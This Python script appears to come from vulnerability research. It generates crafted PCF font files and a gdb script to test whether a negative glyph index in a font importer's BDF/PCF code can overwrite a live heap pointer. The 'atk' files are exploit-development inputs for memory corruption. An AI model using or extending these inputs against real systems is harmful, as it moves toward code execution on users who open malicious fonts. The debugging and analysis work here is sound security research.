#!/usr/bin/env python3
"""Probe whether a file-chosen negative write can steer a live heap pointer.

The value-ceiling gdb dump showed a pointer-shaped word 0x0000555555c227f0
at (char*)encs-200 inside a live 0x70 chunk, 200 bytes before encs. The
file-chosen glyph range from a one-byte-truncated index is -256..-1, so
encs[-50] == (char*)encs-200 reaches that word. Create a file whose one
write sets its low four bytes to 0x00414243 ("CBA\0" little-endian), and
dump the surrounding words before/after to see whether anything later
dereferences the changed pointer.
"""
import pathlib
import struct

HERE = pathlib.Path(__file__).resolve().parent
BASE = bytearray((HERE / "truncated.pcf").read_bytes())


def case(name, min2, min1, low_byte=None, full_index=None):
    data = bytearray(BASE[:0x123])
    struct.pack_into("<HHHH", data, 0x118, min2, min2, min1, min1)
    if low_byte is not None:
        data[0x122] = low_byte
        data = data[:0x123]
    else:
        data[0x122:0x123] = struct.pack("<H", full_index)
    out = HERE / name
    out.write_bytes(data)
    print(f"{name}: rhs={min2 * 256 + min1:#010x} glyph="
          f"{(low_byte - 256 if low_byte is not None else full_index)}")


for _name in ("value-probe", "value-atk50", "value-atkceiling"):
    (HERE / f"import-{_name}.ff").write_text(
        "New()\n" f'Import("{HERE / (_name + ".pcf")}")\n')

(HERE / "gdb-ptr-target.cmd").write_text(
    "set pagination off\n"
    "break fvimportbdf.c:1751 if glyph < 0\n"
    "run -script import-value-atk50.ff\n"
    'printf "HIT glyph=%d i=%d encs=%p\\n", glyph, i, encs\n'
    "x/16gx (char*)encs-224\n"
    "watch *(long*)((char*)encs-200)\n"
    "continue\n"
    'printf "after write, pointer word at encs-200:\\n"\n'
    "x/gx (char*)encs-200\n"
    "x/4xb (char*)encs-200\n"
    "continue\n"
    'printf "end of run\\n"\n'
    "bt 4\n"
    "quit\n"
)

case("value-probe.pcf", 0x4142, 0x0043, full_index=0x0001)      # in-bounds control
case("value-atk50.pcf", 0x4142, 0x0043, low_byte=0xCE)          # glyph=-50 -> encs-200
case("value-atkceiling.pcf", 0xFFFF, 0xFFFF, low_byte=0xCE)     # glyph=-50, rhs max
